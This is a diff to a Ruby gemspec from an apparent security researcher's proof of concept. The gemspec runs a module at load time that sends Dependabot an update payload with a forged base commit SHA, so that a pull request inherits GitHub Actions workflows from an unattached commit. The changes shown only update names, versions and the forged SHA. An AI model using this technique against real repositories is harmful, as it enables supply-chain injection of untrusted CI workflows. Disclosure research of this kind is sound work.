@@ -5,12 +5,12 @@ require "net/http"
 require "uri"
 
 # Researcher-owned GitHub.com proof. The only explicit update is an inert
-# vendor marker. The two proof workflows are inherited from an unattached
+# vendor marker. The proof workflows are inherited from an unattached
 # commit selected through the separately documented Dependabot base-SHA bug.
 module OwnedDependabotInstallWorkflows
-  DEPENDENCY_NAME = "owned_gei_artifact_pivot_probe_v7"
-  FORGED_BASE_SHA = "111d24bb3e8ddb77e599ff80f28d33b258cc4a07"
-  MARKER_PATH = "vendor/owned-gei-artifact-pivot-install-v7.txt"
+  DEPENDENCY_NAME = "owned_official_downloader_dot_probe_v8"
+  FORGED_BASE_SHA = "8a827014d07e7fbc6157c69a5121d18454013fab"
+  MARKER_PATH = "vendor/owned-official-downloader-dot-install-v8.txt"
 
   module_function
 
@@ -60,8 +60,8 @@ module OwnedDependabotInstallWorkflows
       "data" => {
         "dependencies" => [{
           "name" => DEPENDENCY_NAME,
-          "version" => "0.0.24",
-          "previous-version" => "0.0.23",
+          "version" => "0.0.25",
+          "previous-version" => "0.0.24",
           "requirements" => [requirement],
           "previous-requirements" => [requirement],
           "directory" => "/"
@@ -77,9 +77,9 @@ module OwnedDependabotInstallWorkflows
           "operation" => "create"
         }],
         "base-commit-sha" => FORGED_BASE_SHA,
-        "commit-message" => "test: install owned artifact-pivot proof",
-        "pr-title" => "Owned Actions artifact-pivot proof",
-        "pr-body" => "Researcher-owned security test. Two benign workflows are inherited from the caller-selected parent. They only test Actions artifact handling and never print or transmit credentials."
+        "commit-message" => "test: install owned official downloader dot proof",
+        "pr-title" => "Owned official downloader dot proof",
+        "pr-body" => "Researcher-owned security test. Benign workflows are inherited from the caller-selected parent. They only test Actions artifact handling and never print or transmit credentials."
       }
     }
   end
@@ -89,7 +89,7 @@ OwnedDependabotInstallWorkflows.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.24"
+  spec.version = "0.0.25"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
